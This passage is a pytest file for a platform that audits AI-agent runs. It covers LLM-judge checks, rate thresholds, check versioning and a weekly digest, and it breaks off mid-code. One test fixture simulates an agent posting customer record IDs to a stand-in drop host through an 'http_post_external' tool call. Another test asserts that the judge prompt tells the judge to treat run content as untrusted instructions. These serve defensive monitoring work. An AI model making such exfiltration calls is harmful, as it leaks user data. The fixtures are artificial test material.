# Copyright 2026 Brutor AI Ltd.
# SPDX-License-Identifier: Apache-2.0

"""
Continuous Assurance Checks + weekly digest.

What is worth defending:

  * **NL never executes.** Creating a deterministic check requires the
    Rust core's compile verdict; a rejected expression is a 422 with the
    evaluator's errors, an unreachable evaluator is a 503 — authoring
    fails closed.
  * **Versions are immutable evidence.** Spec changes bump the version,
    write a snapshot, and drop enablement until re-approved; enabling
    records the approver.
  * **The judge is governed and budgeted.** Tier-B results carry the
    evaluator fingerprint and token spend; budget exhaustion and a
    missing judge model surface as `check_stalled` inbox findings, never
    as silence. Sampling is deterministic.
  * **Windowed thresholds aggregate what the core wrote.** rate_over
    raises exactly when the window rate crosses the line.
  * **The digest is a stored projection.** One row per (tenant, week);
    delivery is idempotent per subscription; the console lists exactly
    what was sent.
"""

import os

os.environ.setdefault("DATABASE_URL", "postgresql://test:test@127.0.0.1:1/test")
os.environ.setdefault("JWT_SECRET", "test-jwt-secret-not-for-production")
os.environ.setdefault("JWT_ALGORITHM", "HS256")
os.environ.setdefault("ENCRYPTION_KEY", "a" * 44 + "=")

import json
import uuid
from datetime import date, datetime, timedelta, timezone
from typing import Dict, List, Tuple

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, event
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool
from ulid import ULID

from app.api.v1.endpoints.admin.admin_rbac import create_admin_users_router
from app.api.v1.endpoints.admin.assurance_checks import (
    create_assurance_checks_router,
)
from app.api.v1.endpoints.admin.assurance_digest import (
    create_assurance_digest_router,
)
from app.core.admin_user.permissions import Permission
from app.core.admin_user.services.unified_auth_service import UnifiedAuthService
from app.core.logging_system import BrutorLogger
from app.database import Base, get_db
from app.database.models.admin import (
    SystemAdmin,
    SystemAdminAuditLog,
    SystemAdminSession,
    TenantAdmin,
    TenantAdminAuditLog,
    TenantAdminSession,
    TenantRole,
    TenantRolePermission,
)
from app.database.models.ai_system_drift import AISystemDriftEvent
from app.database.models.ai_system_health import AISystemHealth
from app.database.models.ai_system_run import AISystemRun
from app.database.models.assurance_check import (
    AssuranceCheck,
    AssuranceCheckResult,
    AssuranceCheckVersion,
    AssuranceDigest,
    compute_spec_hash,
)
from app.database.models.assurance_inbox import (
    AssuranceInboxEvent,
    AssuranceInboxItem,
)
from app.database.models.end_user import EndUser
from app.database.models.end_user_group import (
    EndUserGroup,
    resource_group_end_user_groups,
)
from app.database.models.idp_server import IdPServer
from app.database.models.llm_model import LLModel
from app.database.models.notification_channel import (
    NotificationChannel,
    NotificationDelivery,
    NotificationSubscription,
)
from app.database.models.proxy_log import ProxyLog
from app.database.models.resource_group import GroupType, ResourceGroup
from app.database.models.tenant import Tenant
from app.services.assurance_checks import core_client
from app.services.assurance_checks.judge import (
    JudgeExecutor,
    evaluator_fingerprint,
    parse_judge_value,
    sampled,
)
from app.services.assurance_checks.scheduler import evaluate_rate_windows
from app.services.assurance_digest import (
    build_digest,
    current_week_start,
    digest_due,
    digest_schedule,
    store_digest,
)
from app.services import assurance_digest_scheduler
from app.services.assurance_inbox import AssuranceInboxService
from app.services.assurance_notifications import (
    NotificationDeliverer,
    NotificationDispatcher,
    render_digest_slack,
    render_digest_webhook,
)

JWT_SECRET = os.environ["JWT_SECRET"]

REQUIRED_TABLES = [
    LLModel.__table__,
    Tenant.__table__,
    TenantRole.__table__,
    TenantRolePermission.__table__,
    SystemAdmin.__table__,
    TenantAdmin.__table__,
    IdPServer.__table__,
    EndUser.__table__,
    SystemAdminSession.__table__,
    TenantAdminSession.__table__,
    SystemAdminAuditLog.__table__,
    TenantAdminAuditLog.__table__,
    AssuranceInboxItem.__table__,
    AssuranceInboxEvent.__table__,
    NotificationChannel.__table__,
    NotificationSubscription.__table__,
    NotificationDelivery.__table__,
    AssuranceCheck.__table__,
    AssuranceCheckVersion.__table__,
    AssuranceCheckResult.__table__,
    AssuranceDigest.__table__,
    AISystemRun.__table__,
    AISystemHealth.__table__,
    AISystemDriftEvent.__table__,
    ProxyLog.__table__,
    ResourceGroup.__table__,
    # ResourceGroup eagerly (selectin) loads its EndUserGroup binding —
    # the tables must exist even though these tests never populate them.
    EndUserGroup.__table__,
    resource_group_end_user_groups,
]


class FakeEncryption:
    def encrypt(self, plaintext: str, **_kw) -> str:
        return "enc:" + plaintext

    def decrypt(self, encrypted: str) -> str:
        assert encrypted.startswith("enc:")
        return encrypted[4:]


class RecordingDeliverer(NotificationDeliverer):
    def __init__(self, fail: bool = False):
        super().__init__(BrutorLogger("test-deliverer"))
        self.fail = fail
        self.posts: List[Tuple[str, bytes, Dict[str, str]]] = []

    def post(self, url, body, headers):
        self.posts.append((url, body, headers))
        if self.fail:
            return False, "simulated failure"
        return True, ""


class _H:
    def __init__(self, client, Factory):
        self.client = client
        self.Factory = Factory

    def login(self, tenant_id: str) -> Dict[str, str]:
        r = self.client.post(
            "/v1/admin/users/tenant/login",
            json={
                "username": f"admin_{tenant_id}",
                "password": "Secret123!",
                "tenant_id": tenant_id,
            },
        )
        assert r.status_code == 200, r.text
        return {"Authorization": f"Bearer {r.json()['access_token']}"}


@pytest.fixture()
def harness():
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
        future=True,
    )

    # Foreign keys stay OFF in this suite (unlike the notifications one):
    # `tenants.default_judge_model_id` would drag llm_models → llm_providers
    # → their whole FK closure into the harness for a value these tests only
    # ever read. Cascade behavior is covered by the Postgres-side suites.
    Base.metadata.create_all(bind=engine, tables=REQUIRED_TABLES)
    Factory = sessionmaker(bind=engine, autoflush=False, autocommit=False, future=True)

    def override_get_db():
        s = Factory()
        try:
            yield s
            s.commit()
        except Exception:
            s.rollback()
            raise
        finally:
            s.close()

    app = FastAPI()
    logger = BrutorLogger("test-checks")
    app.include_router(create_admin_users_router(logger), prefix="/v1")
    app.include_router(create_assurance_checks_router(logger), prefix="/v1")
    app.include_router(create_assurance_digest_router(logger), prefix="/v1")
    app.dependency_overrides[get_db] = override_get_db

    client = TestClient(app)
    auth = UnifiedAuthService(jwt_secret=JWT_SECRET)
    s = Factory()
    try:
        for tid in ("t1", "t2"):
            s.add(
                Tenant(
                    id=tid, name=tid, display_name=tid.upper(),
                    organization_name=tid.upper(),
                    primary_contact_email=f"admin@{tid}.example",
                    is_active=True, is_default=False, is_trial=False,
                    suspended=False, billing_plan="self_hosted", features={},
                    default_judge_model_id="judge-model",
                )
            )
            s.flush()
            role = TenantRole(
                id=f"role-{tid}-admin", tenant_id=tid, name="Tenant Admin",
                description="full-perm admin", is_system=True,
            )
            s.add(role)
            s.flush()
            for p in Permission:
                if p == Permission.SYSTEM_ADMIN:
                    continue
                s.add(
                    TenantRolePermission(
                        id=f"perm-{uuid.uuid4().hex[:10]}",
                        role_id=role.id, permission=p.value,
                    )
                )
            auth.create_tenant_admin(
                username=f"admin_{tid}", email=f"admin@{tid}.example",
                password="Secret123!", tenant_id=tid, db=s, role_id=role.id,
            )
        s.commit()
    finally:
        s.close()

    yield _H(client=client, Factory=Factory)
    app.dependency_overrides.clear()
    engine.dispose()


# ── seeding helpers ─────────────────────────────────────────────────────


def _spec(**over):
    spec = {
        "scope": {},
        "tier": "deterministic",
        "evaluator": {"expression": "run.guardrail_block_count > 0"},
        "output": "boolean",
        "trigger": "on_finalize",
        "threshold": {"kind": "value", "op": "eq", "value": True,
                      "severity": "critical"},
    }
    spec.update(over)
    return spec


def _check(s, tenant_id="t1", name=None, **over) -> AssuranceCheck:
    spec = _spec(**{k: v for k, v in over.items() if k in
                    ("scope", "tier", "evaluator", "output", "trigger", "threshold")})
    row = AssuranceCheck(
        id=f"chk-{ULID()}",
        tenant_id=tenant_id,
        name=name or f"check-{uuid.uuid4().hex[:6]}",
        version=over.get("version", 1),
        spec_hash=compute_spec_hash(spec),
        scope=spec["scope"],
        tier=spec["tier"],
        evaluator=spec["evaluator"],
        output=spec["output"],
        trigger=spec["trigger"],
        threshold=spec["threshold"],
        route_to_inbox=over.get("route_to_inbox", True),
        enabled=over.get("enabled", True),
        created_by="seed",
    )
    s.add(row)
    s.flush()
    s.add(
        AssuranceCheckVersion(
            id=f"ckv-{ULID()}",
            tenant_id=tenant_id,
            check_id=row.id,
            version=row.version,
            spec_hash=row.spec_hash,
            spec=spec,
            created_by="seed",
        )
    )
    s.commit()
    s.refresh(row)
    s.expunge(row)
    return row


def _run(s, tenant_id="t1", ai_system_id=None, hours_ago=1, **over) -> AISystemRun:
    ended = datetime.now(timezone.utc) - timedelta(hours=hours_ago)
    row = AISystemRun(
        id=f"run-{ULID()}",
        tenant_id=tenant_id,
        root_task_id=f"task-{uuid.uuid4().hex[:8]}",
        ai_system_id=ai_system_id,
        started_at=ended - timedelta(minutes=5),
        ended_at=ended,
        terminal_state=over.get("terminal_state", "completed"),
        finalized_by="explicit",
        total_cost_usd=over.get("total_cost_usd", 0.5),
        is_replay=over.get("is_replay", False),
    )
    s.add(row)
    s.commit()
    s.refresh(row)
    s.expunge(row)
    return row


def _result(s, check, run_id, value, hours_ago=1, backtest=False, tokens=None):
    row = AssuranceCheckResult(
        id=f"ckr-{ULID()}",
        tenant_id=check.tenant_id,
        check_id=check.id,
        check_version=check.version,
        run_id=run_id,
        value={"value": value},
        evidence={},
        evaluator_fingerprint=check.spec_hash,
        backtest=backtest,
        tokens_used=tokens,
        evaluated_at=datetime.now(timezone.utc) - timedelta(hours=hours_ago),
    )
    s.add(row)
    s.commit()
    return row


def _proxy_log(s, tenant_id, root_task_id, req="ask a question", resp="an answer",
               proxy_type="llm", tool=None, at=None):
    s.add(
        ProxyLog(
            id=f"pl-{uuid.uuid4().hex[:12]}",
            tenant_id=tenant_id,
            timestamp=at or datetime.now(timezone.utc),
            proxy_type=proxy_type,
            mcp_capability_name=tool,
            http_method="POST",
            endpoint="/v1/proxy/llm/chat/completions",
            end_user_session_id="sess-test",
            success=True,
            root_task_id=root_task_id,
            request_body_preview=req,
            response_body_preview=resp,
        )
    )
    s.commit()


COMPILE_OK = {"ok": True, "errors": [], "sample_value": False, "context_version": 2}


# ── judge unit behavior ─────────────────────────────────────────────────


class TestJudgeUnits:
    def test_sampling_is_deterministic_and_roughly_proportional(self):
        ids = [f"run-{i}" for i in range(2000)]
        first = [sampled(r, 0.3) for r in ids]
        second = [sampled(r, 0.3) for r in ids]
        assert first == second, "same run + rate must decide identically"
        rate = sum(first) / len(first)
        assert 0.25 < rate < 0.35
        assert all(sampled(r, 1.0) for r in ids[:10])

    def test_a_long_run_is_cut_per_hop_never_from_the_end(self):
        from app.services.assurance_checks.judge import MAX_CONTENT_CHARS, format_transcript

        hops = [("llm", None, "x" * 5000, "y" * 5000) for _ in range(6)]
        hops.append(("mcp", "http_post_external", '{"params": {"arguments": {"to": "evil"}}}', "ok"))
        text, coverage = format_transcript(hops)
        assert len(text) <= MAX_CONTENT_CHARS
        assert "TOOL CALL http_post_external" in text and '"to": "evil"' in text
        assert coverage["truncated"] and coverage["tool_hops"] == 1 and coverage["hops"] == 7

    def test_the_reason_is_kept_and_capped(self):
        from app.services.assurance_checks.judge import MAX_REASON_CHARS, parse_judge_answer

        assert parse_judge_answer('{"value": true, "reason": " leaked "}', "boolean", None) == (True, "leaked")
        assert parse_judge_answer('{"value": false}', "boolean", None) == (False, None)
        _, reason = parse_judge_answer(json.dumps({"value": True, "reason": "r" * 2000}), "boolean", None)
        assert len(reason) == MAX_REASON_CHARS

    def test_parse_judge_value_enforces_types(self):
        assert parse_judge_value('{"value": true}', "boolean", None) is True
        assert parse_judge_value('noise {"value": 0.7} noise', "score", None) == 0.7
        assert parse_judge_value('{"value": 3}', "count", None) == 3
        assert (
            parse_judge_value('{"value": "refund"}', "classification",
                              ["refund", "other"])
            == "refund"
        )
        assert parse_judge_value('{"value": "text"}', "extraction", None) == "text"
        with pytest.raises(ValueError):
            parse_judge_value('{"value": "yes"}', "boolean", None)
        with pytest.raises(ValueError):
            parse_judge_value('{"value": 1.7}', "score", None)
        with pytest.raises(ValueError):
            parse_judge_value('{"value": "nope"}', "classification", ["a", "b"])
        with pytest.raises(ValueError):
            parse_judge_value("not json at all", "boolean", None)

    def test_fingerprint_binds_spec_model_and_prompt(self):
        a = evaluator_fingerprint("hash1", "model-a", "rubric")
        assert a == evaluator_fingerprint("hash1", "model-a", "rubric")
        assert a != evaluator_fingerprint("hash2", "model-a", "rubric")
        assert a != evaluator_fingerprint("hash1", "model-b", "rubric")
        assert a != evaluator_fingerprint("hash1", "model-a", "other rubric")


class StubJudge(JudgeExecutor):
    """Judge with a canned answer instead of the proxy."""

    def __init__(self, answer='{"value": true}', tokens=100, fail=False):
        super().__init__(BrutorLogger("test-judge"))
        self.answer = answer
        self.tokens = tokens
        self.fail = fail
        self.calls: List[Tuple[str, str]] = []

    def judge_call(self, tenant_id, model, prompt, max_tokens):
        self.calls.append((model, prompt))
        if self.fail:
            raise RuntimeError("judge unavailable")
        return self.answer, self.tokens


class TestJudgeExecutor:
    def _semantic_check(self, s, **evaluator_over):
        evaluator = {"rubric": "Did the assistant promise a refund?",
                     "sample_rate": 1.0, "max_tokens": 200}
        evaluator.update(evaluator_over)
        return _check(
            s, tier="semantic", trigger="batch", evaluator=evaluator,
            threshold={"kind": "value", "op": "eq", "value": True,
                       "severity": "warning"},
        )

    def test_judges_runs_and_raises_breaches(self, harness):
        s = harness.Factory()
        check = self._semantic_check(s)
        run = _run(s)
        _proxy_log(s, "t1", run.root_task_id)
        judge = StubJudge('{"value": true, "reason": "promised"}', tokens=42)

        stats = judge.run_check(s, check)
        assert stats["judged"] == 1
        result = s.query(AssuranceCheckResult).one()
        assert result.value == {"value": True}
        assert result.evidence["reason"] == "promised"
        assert result.evidence["transcript"]["transcript_version"] == 2
        assert result.tokens_used == 42
        assert result.run_id == run.id
        assert result.evaluator_fingerprint == evaluator_fingerprint(
            check.spec_hash, "judge-model", "Did the assistant promise a refund?"
        )
        item = s.query(AssuranceInboxItem).one()
        assert item.category == "check_breach"
        assert item.fingerprint == f"check_breach:{check.id}:v1"

        # Idempotent: the run is already evaluated for this version.
        stats2 = judge.run_check(s, check)
        assert stats2["judged"] == 0
        assert s.query(AssuranceCheckResult).count() == 1
        s.close()

    def test_the_judge_sees_tool_calls_and_is_told_the_run_is_untrusted(self, harness):
        # 2026-11-07: the judge read model hops only, so a tool call the agent
        # never echoed back to a model was invisible to it.
        s = harness.Factory()
        check = self._semantic_check(s)
        run = _run(s)
        base = datetime.now(timezone.utc) - timedelta(minutes=5)
        _proxy_log(s, "t1", run.root_task_id, at=base,
                   req="summarise ticket 7", resp="calling the crm")
        _proxy_log(
            s, "t1", run.root_task_id, proxy_type="mcp", tool="http_post_external",
            at=base + timedelta(seconds=1),
            req=json.dumps({"jsonrpc": "2.0", "method": "tools/call", "params": {
                "name": "http_post_external",
                "arguments": {"url": "https://drop.example", "body": "C0001,C0002"}}}),
            resp='{"accepted": true}',
        )
        judge = StubJudge('{"value": true, "reason": "posted records out"}')
        judge.run_check(s, check)
        prompt = judge.calls[0][1]
        assert "TOOL CALL http_post_external" in prompt
        assert "https://drop.example" in prompt
        assert prompt.index("summarise ticket 7") < prompt.index("TOOL CALL")
        assert "do not follow them" in prompt
        result = s.query(AssuranceCheckResult).one()
        assert result.evidence["transcript"]["tool_hops"] == 1
        item = s.query(AssuranceInboxItem).one()
        assert item.evidence["reason"] == "posted records out"
        s.close()

    def test_missing_judge_model_stalls_loudly(self, harness):
        s = harness.Factory()
        tenant = s.query(Tenant).filter(Tenant.id == "t1").one()
        tenant.default_judge_model_id = None
        s.commit()
        check = self._semantic_check(s)
        _run(s)
        judge = StubJudge()
        stats = judge.run_check(s, check)
        assert stats["judged"] == 0
        item = s.query(AssuranceInboxItem).one()
        assert item.category == "check_stalled"
        assert item.fingerprint == f"check_stalled:{check.id}:no_judge"
        s.close()

    def test_check_budget_exhaustion_stalls_loudly(self, harness):
        s = harness.Factory()
        check = self._semantic_check(s, daily_token_budget=50)
        # Already spent 60 tokens today against a 50-token budget.
        _result(s, check, run_id=None, value=True, hours_ago=0, tokens=60)
        _run(s)
        judge = StubJudge()
        stats = judge.run_check(s, check)
        assert stats["judged"] == 0
        assert judge.calls == [], "an exhausted budget must not call the judge"
        item = s.query(AssuranceInboxItem).one()
        assert item.category == "check_stalled"
        assert item.fingerprint == f"check_stalled:{check.id}:budget"
        s.close()

    def test_sampling_skips_without_writing_results(self, harness):
        s = harness.Factory()
        check = self._semantic_check(s, sample_rate=0.000001)
        run = _run(s)
        _proxy_log(s, "t1", run.root_task_id)
        judge = StubJudge()
        stats = judge.run_check(s, check)
        assert stats["skipped_sampling"] == 1
        # Unsampled = no row: coverage counts never inflate.
        assert s.query(AssuranceCheckResult).count() == 0
        s.close()

    def test_scope_and_replay_filters(self, harness):
        s = harness.Factory()
        check = self._semantic_check(s)
        check.scope = {"ai_system_ids": ["sys-a"]}
        s.commit()
        out_of_scope = _run(s, ai_system_id="sys-b")
        _proxy_log(s, "t1", out_of_scope.root_task_id)
        replay = _run(s, ai_system_id="sys-a", is_replay=True)
        _proxy_log(s, "t1", replay.root_task_id)
        judge = StubJudge()
        stats = judge.run_check(s, check)
        assert stats["judged"] == 0
        assert s.query(AssuranceCheckResult).count() == 0
        s.close()


# ── windowed rate thresholds (CP half) ──────────────────────────────────


class TestRateWindows:
    def _rate_check(self, s, rate_threshold=0.5):
        return _check(
            s,
            threshold={"kind": "rate_over", "window_hours": 24, "op": "gt",
                       "value": rate_threshold, "severity": "critical"},
        )

    def test_breach_when_rate_crosses(self, harness):
        s = harness.Factory()
        check = self._rate_check(s, rate_threshold=0.5)
        for i, value in enumerate([True, True, True, False]):
            _result(s, check, run_id=f"run-{i}", value=value)
        raised = evaluate_rate_windows(s, AssuranceInboxService())
        assert raised == 1
        item = s.query(AssuranceInboxItem).one()
        assert item.category == "check_breach"
        assert item.fingerprint == f"check_breach:{check.id}:v1:rate"
        assert "3/4" in item.title
        window_row = (
            s.query(AssuranceCheckResult)
            .filter(AssuranceCheckResult.run_id.is_(None))
            .one()
        )
        assert window_row.value["value"] == 0.75
        assert window_row.window_start is not None
        s.close()

    def test_no_breach_under_the_line(self, harness):
        s = harness.Factory()
        check = self._rate_check(s, rate_threshold=0.9)
        for i, value in enumerate([True, False, False, False]):
            _result(s, check, run_id=f"run-{i}", value=value)
        raised = evaluate_rate_windows(s, AssuranceInboxService())
        assert raised == 0
        assert s.query(AssuranceInboxItem).count() == 0
        s.close()

    def test_backtest_rows_do_not_count(self, harness):
        s = harness.Factory()
        check = self._rate_check(s, rate_threshold=0.5)
        for i in range(4):
            _result(s, check, run_id=f"bt-{i}", value=True, backtest=True)
        raised = evaluate_rate_windows(s, AssuranceInboxService())
        assert raised == 0
        s.close()


# ── endpoints ───────────────────────────────────────────────────────────


class TestCheckEndpoints:
    def test_create_requires_core_verdict(self, harness, monkeypatch):
        headers = harness.login("t1")
        calls = {}

        def fake_compile(tenant_id, expression, output=None):
            calls["args"] = (tenant_id, expression, output)
            return COMPILE_OK

        monkeypatch.setattr(core_client, "compile_expression", fake_compile)
        r = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=headers,
            json={
                "name": "guardrail blocks",
                "tier": "deterministic",
                "evaluator": {"expression": "run.guardrail_block_count > 0"},
                "output": "boolean",
                "threshold": {"kind": "value", "op": "eq", "value": True,
                              "severity": "critical"},
            },
        )
        assert r.status_code == 201, r.text
        body = r.json()
        assert body["version"] == 1
        assert body["enabled"] is False
        assert body["trigger"] == "on_finalize"
        assert calls["args"] == ("t1", "run.guardrail_block_count > 0", "boolean")

        s = harness.Factory()
        snap = s.query(AssuranceCheckVersion).one()
        assert snap.version == 1
        assert snap.spec["evaluator"]["expression"] == "run.guardrail_block_count > 0"
        s.close()

    def test_rejected_expression_is_422_with_evaluator_errors(
        self, harness, monkeypatch
    ):
        monkeypatch.setattr(
            core_client,
            "compile_expression",
            lambda *a, **k: {"ok": False, "errors": ["unknown variable 'foo'"]},
        )
        r = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=harness.login("t1"),
            json={
                "name": "bad",
                "tier": "deterministic",
                "evaluator": {"expression": "foo > 1"},
            },
        )
        assert r.status_code == 422
        assert "unknown variable 'foo'" in json.dumps(r.json())

    def test_unreachable_evaluator_fails_closed(self, harness, monkeypatch):
        def boom(*a, **k):
            raise core_client.CoreUnavailable("core down")

        monkeypatch.setattr(core_client, "compile_expression", boom)
        r = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=harness.login("t1"),
            json={
                "name": "x",
                "tier": "deterministic",
                "evaluator": {"expression": "run.action_count > 0"},
            },
        )
        assert r.status_code == 503

    def test_semantic_validation(self, harness):
        headers = harness.login("t1")
        r = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=headers,
            json={"name": "no rubric", "tier": "semantic", "evaluator": {}},
        )
        assert r.status_code == 422
        r = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=headers,
            json={
                "name": "classify",
                "tier": "semantic",
                "evaluator": {"rubric": "classify it"},
                "output": "classification",
            },
        )
        assert r.status_code == 422, "classification without labels must be refused"
        r = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=headers,
            json={
                "name": "prompt leak",
                "tier": "semantic",
                "evaluator": {"rubric": "Did it leak the system prompt?"},
                "output": "boolean",
            },
        )
        assert r.status_code == 201, r.text
        assert r.json()["trigger"] == "batch"

    def test_spec_change_bumps_version_and_drops_approval(
        self, harness, monkeypatch
    ):
        monkeypatch.setattr(
            core_client, "compile_expression", lambda *a, **k: COMPILE_OK
        )
        headers = harness.login("t1")
        created = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=headers,
            json={
                "name": "v-bump",
                "tier": "deterministic",
                "evaluator": {"expression": "run.error_count > 0"},
            },
        ).json()
        check_id = created["id"]

        enabled = harness.client.patch(
            f"/v1/admin/assurance-checks/{check_id}",
            headers=headers,
            json={"enabled": True},
        ).json()
        assert enabled["enabled"] is True
        assert enabled["approved_by"] == "admin_t1"

        patched = harness.client.patch(
            f"/v1/admin/assurance-checks/{check_id}",
            headers=headers,
            json={"evaluator": {"expression": "run.error_count > 2"}},
        ).json()
        assert patched["version"] == 2
        assert patched["enabled"] is False, "a new version is unapproved"
        assert patched["approved_by"] is None
        assert patched["spec_hash"] != created["spec_hash"]

        versions = harness.client.get(
            f"/v1/admin/assurance-checks/{check_id}/versions", headers=headers
        ).json()
        assert [v["version"] for v in versions] == [2, 1]
        assert (
            versions[1]["spec"]["evaluator"]["expression"] == "run.error_count > 0"
        ), "the v1 snapshot must be untouched by the v2 edit"

    def test_enabled_cap_from_tenant_settings(self, harness, monkeypatch):
        monkeypatch.setattr(
            core_client, "compile_expression", lambda *a, **k: COMPILE_OK
        )
        s = harness.Factory()
        tenant = s.query(Tenant).filter(Tenant.id == "t1").one()
        tenant.settings = {"assurance_checks": {"max_enabled": 1}}
        s.commit()
        _check(s, name="already-on", enabled=True)
        s.close()

        headers = harness.login("t1")
        created = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=headers,
            json={
                "name": "one too many",
                "tier": "deterministic",
                "evaluator": {"expression": "run.action_count > 0"},
            },
        ).json()
        r = harness.client.patch(
            f"/v1/admin/assurance-checks/{created['id']}",
            headers=headers,
            json={"enabled": True},
        )
        assert r.status_code == 422
        assert "cap" in r.json()["detail"]

    def test_cross_tenant_isolation_and_name_clash(self, harness, monkeypatch):
        monkeypatch.setattr(
            core_client, "compile_expression", lambda *a, **k: COMPILE_OK
        )
        s = harness.Factory()
        check = _check(s, tenant_id="t1", name="mine")
        s.close()
        r = harness.client.get(
            f"/v1/admin/assurance-checks/{check.id}", headers=harness.login("t2")
        )
        assert r.status_code == 404
        r = harness.client.post(
            "/v1/admin/assurance-checks",
            headers=harness.login("t1"),
            json={
                "name": "mine",
                "tier": "deterministic",
                "evaluator": {"expression": "run.action_count > 0"},
            },
        )
        assert r.status_code == 409

    def test_backtest_stores_summary_on_version(self, harness, monkeypatch):
        s = harness.Factory()
        check = _check(s, tenant_id="t1", name="bt")
        s.close()
        monkeypatch.setattr(
            core_client,
            "backtest",
            lambda *a, **k: {
                "ok": True, "evaluated": 120, "breaches": 4, "errors": 0,
                "window_days": 7, "samples": [],
            },
        )
        r = harness.client.post(
            f"/v1/admin/assurance-checks/{check.id}/backtest",
            headers=harness.login("t1"),
            json={"window_days": 7},
        )
        assert r.status_code == 200
        assert r.json()["breaches"] == 4
        s = harness.Factory()
        snap = s.query(AssuranceCheckVersion).one()
        assert snap.backtest_summary["evaluated"] == 120
        s.close()

    def test_blocking_core_calls_run_off_the_event_loop(self, harness, monkeypatch):
        """CP-6 — `core_client` uses the BLOCKING httpx client (120s timeout
        on backtest, 15s on compile). Awaited straight from an `async def`
        it runs on the event-loop thread and freezes every other request
        this worker is serving for the whole timeout.

        The check is exact rather than a timing heuristic:
        `asyncio.get_running_loop()` succeeds only on the loop thread, so
        a fake that finds no running loop proves the call was dispatched
        to the threadpool.
        """
        import asyncio as _asyncio

        seen = {}

        def _off_loop(name):
            def _fake(*a, **k):
                try:
                    _asyncio.get_running_loop()
                    seen[name] = "event-loop"
                except RuntimeError:
                    seen[name] = "worker-thread"
                if name == "backtest":
                    return {
                        "ok": True, "evaluated": 1, "breaches": 0, "errors": 0,
                        "window_days": 7, "samples": [],
                    }
                return COMPILE_OK
            return _fake

        monkeypatch.setattr(core_client, "backtest", _off_loop("backtest"))
        monkeypatch.setattr(
            core_client, "compile_expression", _off_loop("compile")
        )

        s = harness.Factory()
        check = _check(s, tenant_id="t1", name="offloop")
        s.close()
        headers = harness.login("t1")

        r = harness.client.post(
            f"/v1/admin/assurance-checks/{check.id}/backtest",
            headers=headers, json={"window_days": 7},
        )
        assert r.status_code == 200, r.text
        assert seen["backtest"] == "worker-thread"

        r = harness.client.post(
            "/v1/admin/assurance-checks/compile",
            headers=headers, json={"expression": "run.action_count > 0"},
        )
        assert r.status_code == 200, r.text
        assert seen["compile"] == "worker-thread"

    def test_results_listing_filters_backtest(self, harness):
        s = harness.Factory()
        check = _check(s, tenant_id="t1", name="res")
        _result(s, check, run_id="run-live", value=True)
        _result(s, check, run_id="run-bt", value=False, backtest=True)
        s.close()
        headers = harness.login("t1")
        all_rows = harness.client.get(
            f"/v1/admin/assurance-checks/{check.id}/results", headers=headers
        ).json()
        assert all_rows["total"] == 2
        live = harness.client.get(
            f"/v1/admin/assurance-checks/{check.id}/results?backtest=false",
            headers=headers,
        ).json()
        assert live["total"] == 1
        assert live["results"][0]["run_id"] == "run-live"

    def test_compile_endpoint_proxies_core(self, harness, monkeypatch):
        monkeypatch.setattr(
            core_client, "compile_expression", lambda *a, **k: COMPILE_OK
        )
        r = harness.client.post(
            "/v1/admin/assurance-checks/compile",
            headers=harness.login("t1"),
            json={"expression": "run.total_cost_usd > 1.0", "output": "boolean"},
        )
        assert r.status_code == 200
        assert r.json()["ok"] is True

    def test_compile_assist_reviews_proposal(self, harness, monkeypatch):
        proposal = {
            "tier": "deterministic",
            "reason": "answerable from run facts",
            "evaluator": {"expression": "run.max_delegation_depth > 3"},
            "output": "boolean",
            "threshold": {"kind": "value", "op": "eq", "value": True,
                          "severity": "warning"},
        }
        monkeypatch.setattr(
            JudgeExecutor,
            "judge_call",
            lambda self, tenant_id, model, prompt, max_tokens: (
                json.dumps(proposal), 50
            ),
        )
        monkeypatch.setattr(
            core_client, "compile_expression", lambda *a, **k: COMPILE_OK
        )
        r = harness.client.post(
            "/v1/admin/assurance-checks/compile-assist",
            headers=harness.login("t1"),
            json={"question": "Flag runs with more than 3 delegation hops"},
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["proposal"]["tier"] == "deterministic"
        assert body["downgraded"] is False
        assert body["compile"]["ok"] is True
        assert body["model"] == "judge-model"


# ── digest ──────────────────────────────────────────────────────────────


class TestDigest:
    def test_schedule_defaults_and_due_logic(self, harness):
        s = harness.Factory()
        tenant = s.query(Tenant).filter(Tenant.id == "t1").one()
        schedule = digest_schedule(tenant)
        assert schedule == {"weekday": 0, "hour": 8, "timezone": "UTC"}

        # Monday 07:59 UTC — not yet due; 08:01 — due, covering LAST week.
        monday = datetime(2026, 8, 31, 7, 59, tzinfo=timezone.utc)
        assert digest_due(monday, schedule) is None
        after = datetime(2026, 8, 31, 8, 1, tzinfo=timezone.utc)
        assert digest_due(after, schedule) == date(2026, 8, 24)

        # Tenant-local: Stockholm 08:01 is 06:01 UTC.
        tenant.settings = {"assurance_digest": {"timezone": "Europe/Stockholm"}}
        s.commit()
        schedule = digest_schedule(tenant)
        local_due = datetime(2026, 8, 31, 6, 1, tzinfo=timezone.utc)
        assert digest_due(local_due, schedule) == date(2026, 8, 24)
        assert digest_due(
            datetime(2026, 8, 31, 5, 59, tzinfo=timezone.utc), schedule
        ) is None
        s.close()

    def _seed_estate(self, s, week_start: date):
        mid_week = datetime.combine(week_start, datetime.min.time(),
                                    tzinfo=timezone.utc) + timedelta(days=2)
        s.add(
            ResourceGroup(
                id="sys-1", tenant_id="t1", name="Support Copilot",
                group_type=GroupType.AI_SYSTEM.value, hierarchy_level=0,
                is_active=True,
            )
        )
        s.add(
            AISystemHealth(
                id="hlt-1", tenant_id="t1", ai_system_id="sys-1",
                health_state="degraded", health_score=0.5,
            )
        )
        run = AISystemRun(
            id=f"run-{ULID()}", tenant_id="t1",
            root_task_id=f"task-{uuid.uuid4().hex[:8]}", ai_system_id="sys-1",
            started_at=mid_week, ended_at=mid_week + timedelta(minutes=3),
            terminal_state="completed", finalized_by="explicit",
            total_cost_usd=1.25, is_replay=False,
        )
        s.add(run)
        s.add(
            AssuranceInboxItem(
                id=f"inbox-{ULID()}", tenant_id="t1", ai_system_id="sys-1",
